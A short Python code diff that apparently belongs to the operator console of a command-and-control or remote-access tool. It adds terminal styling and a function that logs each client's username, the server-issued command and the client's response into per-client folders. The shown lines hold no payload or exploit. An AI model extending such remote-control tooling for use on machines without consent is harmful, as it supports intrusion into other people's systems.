@@ -1,3 +1,34 @@
+from prompt_toolkit import print_formatted_text, HTML
+from prompt_toolkit.formatted_text import FormattedText
+from prompt_toolkit.key_binding import KeyBindings
+from prompt_toolkit.keys import Keys
+from prompt_toolkit import PromptSession
+from crypto import *
+import os
+import datetime
+from prompt_toolkit.styles import Style
+
+style = Style.from_dict({
+        'red': 'ansired',
+        'green': 'ansigreen',
+        'bold_blue': 'ansiblue bold',
+        'bright_yellow': 'ansiyellow',
+        'bg_magenta': 'bg:ansimagenta',
+        'bg_rgb': 'bg:#222222',
+        'fg_rgb': '#ff00ff',
+        'bright': 'ansiwhite bold',
+        'ul_bold':'underline bold'
+    })
+
+
+def write_result_to_file(client):
+    if not os.path.exists(client.get_id()):
+        os.makedirs(client.get_id())
+    date_time = datetime.datetime.now().strftime("%D - %H:%M:%S ")
+    if client.get_client_response():
+        if (client.get_client_response() != "¤ping" and client.get_server_command()) or (not client.get_server_command()):
+            with open(client.get_id()+"/output.txt", 'a') as f:
+                f.write(date_time + "\n" + f"User: {client.get_whoami()}\n" + f"Server command: {client.get_server_command()}\n" + client.get_client_response()+"\n\n")
 
 
 def decode_hex_to_bytes(hex_cipher_tag):
